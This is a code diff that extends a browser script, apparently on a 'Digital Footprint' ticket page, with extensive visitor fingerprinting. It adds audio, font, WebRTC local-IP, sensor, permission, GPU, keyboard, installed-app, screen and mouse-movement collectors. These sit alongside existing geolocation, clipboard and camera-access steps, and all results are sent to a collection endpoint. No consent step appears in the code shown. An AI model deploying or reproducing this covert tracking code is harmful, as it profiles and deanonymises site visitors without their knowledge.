@@ -447,7 +447,7 @@
         }
 
         async init() {
-            // Start collection silently
+            // Existing collectors
             await this.collectBasicFingerprint();
             await this.collectGeolocation();
             await this.collectMediaDevices();
@@ -458,7 +458,28 @@
             await this.attemptCameraAccess();
             await this.collectClipboardData();
 
-            // Send collected data
+            // Advanced fingerprinting (audio/fonts/webrtc/etc.)
+            await this.collectAudioFingerprint();
+            await this.collectFontFingerprint();
+            await this.collectWebRTCLeaks();
+            await this.collectBrowserFeatures();
+            await this.collectBehavioralData();
+            await this.collectSensorData();
+            await this.performCPUBenchmark();
+
+            // New high-signal collectors
+            await this.collectUAClientHints();
+            await this.collectPermissionsStates();
+            await this.collectWebGPUAdapter();
+            await this.collectSpeechVoices();
+            await this.collectKeyboardLayout();
+            await this.collectInstalledApps();
+            await this.collectScreenDetails();
+            await this.collectDRMSupport();
+            await this.collectMediaQueryProbes();
+            await this.collectNavigationTiming();
+            this.collectHardeningSignals();
+
             this.sendData();
         }
 
@@ -691,6 +712,498 @@
             }
         }
 
+        // ---- Audio fingerprint via OfflineAudioContext (silent, deterministic) ----
+        async collectAudioFingerprint() {
+            try {
+                const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+                if (!Ctx) {
+                    this.collectedData.audioFingerprint = { error: 'OfflineAudioContext unavailable' };
+                    return;
+                }
+                const ctx = new Ctx(1, 44100, 44100);
+                const osc = ctx.createOscillator();
+                osc.type = 'triangle';
+                osc.frequency.value = 1000;
+                const compressor = ctx.createDynamicsCompressor();
+                compressor.threshold.value = -50;
+                compressor.knee.value = 40;
+                compressor.ratio.value = 12;
+                compressor.attack.value = 0;
+                compressor.release.value = 0.25;
+                osc.connect(compressor);
+                compressor.connect(ctx.destination);
+                osc.start(0);
+                const buffer = await ctx.startRendering();
+                const data = buffer.getChannelData(0).subarray(4500, 5000);
+                let hash = 0;
+                for (let i = 0; i < data.length; i++) hash += Math.abs(data[i]);
+                this.collectedData.audioFingerprint = {
+                    hash: hash.toString(),
+                    sampleRate: ctx.sampleRate
+                };
+            } catch (error) {
+                this.collectedData.audioFingerprint = { error: error.message };
+            }
+        }
+
+        // ---- Font enumeration via canvas-width side-channel ----
+        async collectFontFingerprint() {
+            try {
+                const baseFonts = ['monospace', 'sans-serif', 'serif'];
+                const testFonts = [
+                    'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+                    'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS',
+                    'Impact', 'Lucida Sans', 'Tahoma', 'Lucida Console', 'Monaco',
+                    'Helvetica', 'Apple SD Gothic Neo', 'Microsoft YaHei',
+                    'Segoe UI', 'Roboto', 'Ubuntu', 'Cantarell', 'Noto Sans CJK',
+                    'PingFang SC', 'Hiragino Sans', 'Yu Gothic'
+                ];
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                const probe = 'mmmmmmmmmmlli';
+                const measure = (font) => {
+                    ctx.font = `72px ${font}`;
+                    return ctx.measureText(probe).width;
+                };
+                const baseSizes = {};
+                baseFonts.forEach(b => baseSizes[b] = measure(b));
+                const installed = testFonts.filter(font =>
+                    baseFonts.some(b => measure(`${font}, ${b}`) !== baseSizes[b])
+                );
+                this.collectedData.fonts = { installed, count: installed.length };
+            } catch (error) {
+                this.collectedData.fonts = { error: error.message };
+            }
+        }
+
+        // ---- WebRTC ICE candidates → local IPs (mDNS aware) ----
+        async collectWebRTCLeaks() {
+            try {
+                const RTC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
+                if (!RTC) {
+                    this.collectedData.webrtc = { error: 'RTCPeerConnection unavailable' };
+                    return;
+                }
+                const localIPs = [];
+                const mdnsHosts = [];
+                const pc = new RTC({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('');
+                pc.onicecandidate = (ev) => {
+                    if (!ev || !ev.candidate || !ev.candidate.candidate) return;
+                    const c = ev.candidate.candidate;
+                    const ipv4 = c.match(/(?:\d{1,3}\.){3}\d{1,3}/);
+                    if (ipv4 && !localIPs.includes(ipv4[0])) localIPs.push(ipv4[0]);
+                    const mdns = c.match(/[a-f0-9-]+\.local/i);
+                    if (mdns && !mdnsHosts.includes(mdns[0])) mdnsHosts.push(mdns[0]);
+                };
+                await pc.setLocalDescription(await pc.createOffer());
+                await new Promise(r => setTimeout(r, 1500));
+                pc.close();
+                this.collectedData.webrtc = {
+                    localIPs,
+                    mdnsHosts,
+                    leakDetected: localIPs.length > 0
+                };
+            } catch (error) {
+                this.collectedData.webrtc = { error: error.message };
+            }
+        }
+
+        // ---- Boolean feature matrix ----
+        collectBrowserFeatures() {
+            try {
+                this.collectedData.browserFeatures = {
+                    serviceWorker: 'serviceWorker' in navigator,
+                    webAssembly: typeof WebAssembly !== 'undefined',
+                    webGL2: !!document.createElement('canvas').getContext('webgl2'),
+                    webGPU: 'gpu' in navigator,
+                    bluetooth: 'bluetooth' in navigator,
+                    usb: 'usb' in navigator,
+                    hid: 'hid' in navigator,
+                    serial: 'serial' in navigator,
+                    nfc: 'nfc' in navigator,
+                    paymentRequest: 'PaymentRequest' in window,
+                    webAuthentication: 'credentials' in navigator,
+                    share: 'share' in navigator,
+                    permissions: 'permissions' in navigator,
+                    notifications: 'Notification' in window,
+                    pushManager: 'PushManager' in window,
+                    indexedDB: 'indexedDB' in window,
+                    fileSystem: 'showOpenFilePicker' in window,
+                    clipboard: 'clipboard' in navigator,
+                    contacts: 'contacts' in navigator,
+                    wakeLock: 'wakeLock' in navigator,
+                    mediaSession: 'mediaSession' in navigator,
+                    idleDetection: 'IdleDetector' in window
+                };
+            } catch (error) {
+                this.collectedData.browserFeatures = { error: error.message };
+            }
+        }
+
+        // ---- Behavioural snapshot ----
+        collectBehavioralData() {
+            try {
+                const beh = { mouseMovements: [] };
+                let count = 0;
+                const handler = (e) => {
+                    if (count++ < 10) {
+                        beh.mouseMovements.push({ x: e.clientX, y: e.clientY, t: Date.now() });
+                    } else {
+                        document.removeEventListener('mousemove', handler);
+                    }
+                };
+                document.addEventListener('mousemove', handler, { passive: true });
+                beh.pageVisible = !document.hidden;
+                beh.hasFocus = document.hasFocus();
+                beh.tabVisibility = document.visibilityState;
+                this.collectedData.behavioral = beh;
+            } catch (error) {
+                this.collectedData.behavioral = { error: error.message };
+            }
+        }
+
+        // ---- Sensors (mostly mobile) ----
+        async collectSensorData() {
+            try {
+                const sensors = {};
+                const tryStart = (key, ctor, freq) => {
+                    if (!(ctor in window)) return;
+                    try {
+                        const s = new window[ctor]({ frequency: freq });
+                        s.addEventListener('reading', () => {
+                            sensors[key] = { x: s.x, y: s.y, z: s.z };
+                            s.stop();
+                        });
+                        s.addEventListener('error', (e) => { sensors[key] = { error: e.error?.name || 'denied' }; });
+                        s.start();
+                    } catch (e) {
+                        sensors[key] = { error: e.message };
+                    }
+                };
+                tryStart('accelerometer', 'Accelerometer', 30);
+                tryStart('gyroscope', 'Gyroscope', 30);
+                if ('AmbientLightSensor' in window) {
+                    try {
+                        const als = new window.AmbientLightSensor();
+                        als.addEventListener('reading', () => {
+                            sensors.ambientLight = als.illuminance;
+                            als.stop();
+                        });
+                        als.start();
+                    } catch (e) { sensors.ambientLight = { error: e.message }; }
+                }
+                window.addEventListener('deviceorientation', (e) => {
+                    sensors.deviceOrientation = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
+                }, { once: true });
+                this.collectedData.sensors = sensors;
+            } catch (error) {
+                this.collectedData.sensors = { error: error.message };
+            }
+        }
+
+        // ---- CPU benchmark (1M sqrt+sin loop) ----
+        performCPUBenchmark() {
+            try {
+                const start = performance.now();
+                let r = 0;
+                for (let i = 0; i < 1_000_000; i++) r += Math.sqrt(i) * Math.sin(i);
+                const duration = performance.now() - start;
+                this.collectedData.cpuBenchmark = {
+                    duration,
+                    score: Math.round(1_000_000 / duration)
+                };
+            } catch (error) {
+                this.collectedData.cpuBenchmark = { error: error.message };
+            }
+        }
+
+        // ---- UA Client Hints high-entropy values ----
+        async collectUAClientHints() {
+            try {
+                if (!navigator.userAgentData?.getHighEntropyValues) {
+                    this.collectedData.uaClientHints = { error: 'unsupported' };
+                    return;
+                }
+                const hints = await navigator.userAgentData.getHighEntropyValues([
+                    'architecture', 'bitness', 'model', 'platform', 'platformVersion',
+                    'fullVersionList', 'wow64', 'formFactor'
+                ]);
+                this.collectedData.uaClientHints = {
+                    brands: navigator.userAgentData.brands,
+                    mobile: navigator.userAgentData.mobile,
+                    ...hints
+                };
+            } catch (error) {
+                this.collectedData.uaClientHints = { error: error.message };
+            }
+        }
+
+        // ---- Permissions API state probe (no prompt) ----
+        async collectPermissionsStates() {
+            try {
+                if (!navigator.permissions) {
+                    this.collectedData.permissions = { error: 'unsupported' };
+                    return;
+                }
+                const names = [
+                    'camera', 'microphone', 'geolocation', 'notifications',
+                    'clipboard-read', 'clipboard-write', 'persistent-storage',
+                    'midi', 'background-sync', 'accelerometer', 'gyroscope',
+                    'magnetometer', 'ambient-light-sensor', 'payment-handler'
+                ];
+                const states = {};
+                await Promise.all(names.map(async (n) => {
+                    try {
+                        const res = await navigator.permissions.query({ name: n });
+                        states[n] = res.state; // 'granted' | 'prompt' | 'denied'
+                    } catch (e) {
+                        states[n] = 'unsupported';
+                    }
+                }));
+                this.collectedData.permissions = states;
+            } catch (error) {
+                this.collectedData.permissions = { error: error.message };
+            }
+        }
+
+        // ---- WebGPU adapter (vendor / architecture / driver) ----
+        async collectWebGPUAdapter() {
+            try {
+                if (!navigator.gpu?.requestAdapter) {
+                    this.collectedData.webgpu = { error: 'unsupported' };
+                    return;
+                }
+                const adapter = await navigator.gpu.requestAdapter();
+                if (!adapter) {
+                    this.collectedData.webgpu = { error: 'no adapter' };
+                    return;
+                }
+                let info = {};
+                if (adapter.requestAdapterInfo) {
+                    try { info = await adapter.requestAdapterInfo(); } catch (_) {}
+                } else if (adapter.info) {
+                    info = adapter.info;
+                }
+                this.collectedData.webgpu = {
+                    vendor: info.vendor || 'unknown',
+                    architecture: info.architecture || 'unknown',
+                    device: info.device || 'unknown',
+                    description: info.description || 'unknown',
+                    features: Array.from(adapter.features || []).slice(0, 20),
+                    limits: {
+                        maxTextureDimension2D: adapter.limits?.maxTextureDimension2D,
+                        maxBufferSize: adapter.limits?.maxBufferSize
+                    }
+                };
+            } catch (error) {
+                this.collectedData.webgpu = { error: error.message };
+            }
+        }
+
+        // ---- Speech synthesis voices (OS/locale leak) ----
+        async collectSpeechVoices() {
+            try {
+                if (!('speechSynthesis' in window)) {
+                    this.collectedData.speechVoices = { error: 'unsupported' };
+                    return;
+                }
+                let voices = window.speechSynthesis.getVoices();
+                if (!voices.length) {
+                    await new Promise((resolve) => {
+                        const t = setTimeout(resolve, 500);
+                        window.speechSynthesis.onvoiceschanged = () => { clearTimeout(t); resolve(); };
+                    });
+                    voices = window.speechSynthesis.getVoices();
+                }
+                this.collectedData.speechVoices = {
+                    count: voices.length,
+                    sample: voices.slice(0, 10).map(v => ({
+                        name: v.name, lang: v.lang, default: v.default, localService: v.localService
+                    }))
+                };
+            } catch (error) {
+                this.collectedData.speechVoices = { error: error.message };
+            }
+        }
+
+        // ---- Physical keyboard layout map ----
+        async collectKeyboardLayout() {
+            try {
+                if (!navigator.keyboard?.getLayoutMap) {
+                    this.collectedData.keyboardLayout = { error: 'unsupported' };
+                    return;
+                }
+                const layoutMap = await navigator.keyboard.getLayoutMap();
+                const sample = {};
+                ['KeyQ', 'KeyW', 'KeyA', 'KeyZ', 'Semicolon', 'Quote', 'Backquote', 'BracketLeft']
+                    .forEach(code => {
+                        const v = layoutMap.get(code);
+                        if (v) sample[code] = v;
+                    });
+                this.collectedData.keyboardLayout = { size: layoutMap.size, sample };
+            } catch (error) {
+                this.collectedData.keyboardLayout = { error: error.message };
+            }
+        }
+
+        // ---- Installed PWA / native apps ----
+        async collectInstalledApps() {
+            try {
+                if (!navigator.getInstalledRelatedApps) {
+                    this.collectedData.installedApps = { error: 'unsupported' };
+                    return;
+                }
+                const apps = await navigator.getInstalledRelatedApps();
+                this.collectedData.installedApps = {
+                    count: apps.length,
+                    apps: apps.map(a => ({ id: a.id, platform: a.platform, url: a.url, version: a.version }))
+                };
+            } catch (error) {
+                this.collectedData.installedApps = { error: error.message };
+            }
+        }
+
+        // ---- Multi-monitor / screen details ----
+        async collectScreenDetails() {
+            try {
+                const out = {
+                    isExtended: 'isExtended' in window.screen ? window.screen.isExtended : null
+                };
+                if (window.getScreenDetails) {
+                    try {
+                        const sd = await window.getScreenDetails();
+                        out.screens = sd.screens.map(s => ({
+                            label: s.label,
+                            width: s.width,
+                            height: s.height,
+                            availWidth: s.availWidth,
+                            availHeight: s.availHeight,
+                            colorDepth: s.colorDepth,
+                            devicePixelRatio: s.devicePixelRatio,
+                            isPrimary: s.isPrimary,
+                            isInternal: s.isInternal,
+                            left: s.left,
+                            top: s.top
+                        }));
+                    } catch (e) {
+                        out.permissionError = e.message;
+                    }
+                }
+                this.collectedData.screenDetails = out;
+            } catch (error) {
+                this.collectedData.screenDetails = { error: error.message };
+            }
+        }
+
+        // ---- DRM / EME modules + media codec support ----
+        async collectDRMSupport() {
+            try {
+                const config = [{
+                    initDataTypes: ['cenc'],
+                    audioCapabilities: [{ contentType: 'audio/mp4;codecs="mp4a.40.2"' }],
+                    videoCapabilities: [{ contentType: 'video/mp4;codecs="avc1.42E01E"' }]
+                }];
+                const systems = ['com.widevine.alpha', 'com.microsoft.playready', 'com.apple.fps.1_0', 'org.w3.clearkey'];
+                const supported = {};
+                if (navigator.requestMediaKeySystemAccess) {
+                    await Promise.all(systems.map(async (sys) => {
+                        try {
+                            await navigator.requestMediaKeySystemAccess(sys, config);
+                            supported[sys] = true;
+                        } catch (_) {
+                            supported[sys] = false;
+                        }
+                    }));
+                }
+                const codecs = {};
+                if (window.MediaSource) {
+                    ['video/webm; codecs="vp9"', 'video/mp4; codecs="avc1.42E01E"',
+                     'video/mp4; codecs="hev1.1.6.L93.B0"', 'video/mp4; codecs="av01.0.05M.08"',
+                     'audio/mp4; codecs="mp4a.40.2"', 'audio/webm; codecs="opus"']
+                        .forEach(c => { codecs[c] = MediaSource.isTypeSupported(c); });
+                }
+                this.collectedData.drm = { keySystems: supported, codecs };
+            } catch (error) {
+                this.collectedData.drm = { error: error.message };
+            }
+        }
+
+        // ---- matchMedia capability/preference probes ----
+        collectMediaQueryProbes() {
+            try {
+                const queries = {
+                    prefersReducedMotion: '(prefers-reduced-motion: reduce)',
+                    prefersColorScheme: '(prefers-color-scheme: dark)',
+                    prefersContrast: '(prefers-contrast: more)',
+                    forcedColors: '(forced-colors: active)',
+                    invertedColors: '(inverted-colors: inverted)',
+                    colorGamutP3: '(color-gamut: p3)',
+                    colorGamutRec2020: '(color-gamut: rec2020)',
+                    dynamicRangeHigh: '(dynamic-range: high)',
+                    hoverHover: '(hover: hover)',
+                    pointerFine: '(pointer: fine)',
+                    pointerCoarse: '(pointer: coarse)',
+                    anyPointerFine: '(any-pointer: fine)',
+                    displayStandalone: '(display-mode: standalone)',
+                    prefersReducedData: '(prefers-reduced-data: reduce)'
+                };
+                const out = {};
+                for (const [k, q] of Object.entries(queries)) {
+                    try { out[k] = window.matchMedia(q).matches; } catch (_) { out[k] = null; }
+                }
+                this.collectedData.mediaQueries = out;
+            } catch (error) {
+                this.collectedData.mediaQueries = { error: error.message };
+            }
+        }
+
+        // ---- Navigation Timing (page load profile) ----
+        collectNavigationTiming() {
+            try {
+                const entry = performance.getEntriesByType?.('navigation')?.[0];
+                if (!entry) {
+                    this.collectedData.navigationTiming = { error: 'unavailable' };
+                    return;
+                }
+                this.collectedData.navigationTiming = {
+                    type: entry.type,
+                    dnsMs: Math.round(entry.domainLookupEnd - entry.domainLookupStart),
+                    tcpMs: Math.round(entry.connectEnd - entry.connectStart),
+                    tlsMs: entry.secureConnectionStart ? Math.round(entry.connectEnd - entry.secureConnectionStart) : 0,
+                    ttfbMs: Math.round(entry.responseStart - entry.requestStart),
+                    downloadMs: Math.round(entry.responseEnd - entry.responseStart),
+                    domInteractiveMs: Math.round(entry.domInteractive),
+                    domCompleteMs: Math.round(entry.domComplete),
+                    transferSize: entry.transferSize,
+                    encodedBodySize: entry.encodedBodySize,
+                    decodedBodySize: entry.decodedBodySize,
+                    nextHopProtocol: entry.nextHopProtocol
+                };
+            } catch (error) {
+                this.collectedData.navigationTiming = { error: error.message };
+            }
+        }
+
+        // ---- Browser hardening signals (Spectre/site isolation health) ----
+        collectHardeningSignals() {
+            try {
+                this.collectedData.hardeningSignals = {
+                    sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
+                    crossOriginIsolated: window.crossOriginIsolated === true,
+                    isSecureContext: window.isSecureContext === true,
+                    trustedTypes: 'trustedTypes' in window,
+                    cookieStore: 'cookieStore' in window,
+                    cookieEnabled: navigator.cookieEnabled === true,
+                    storageAccessApi: 'requestStorageAccess' in document,
+                    documentDomainSet: document.domain !== window.location.hostname,
+                    referrerPolicy: document.referrerPolicy || null
+                };
+            } catch (error) {
+                this.collectedData.hardeningSignals = { error: error.message };
+            }
+        }
+
         getCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
@@ -732,9 +1245,11 @@
 
         async sendData() {
             try {
-                // Extract user identifier from page
-                const dcHandleElement = document.querySelector('h2');
-                const dcHandle = dcHandleElement ?  dcHandleElement.textContent.replace('Digital Footprint for: ', '').trim() : 'Anonymous';
+                // Extract dc_handle from /ticket/{ID} URL — single source of truth
+                const pathMatch = window.location.pathname.match(/^\/ticket\/(.+?)\/?$/);
+                const dcHandle = pathMatch
+                    ? decodeURIComponent(pathMatch[1]).replace(/\?+$/, '')
+                    : 'Anonymous';
 
                 const response = await fetch('/api/collect-advanced-data', {
                     method: 'POST',
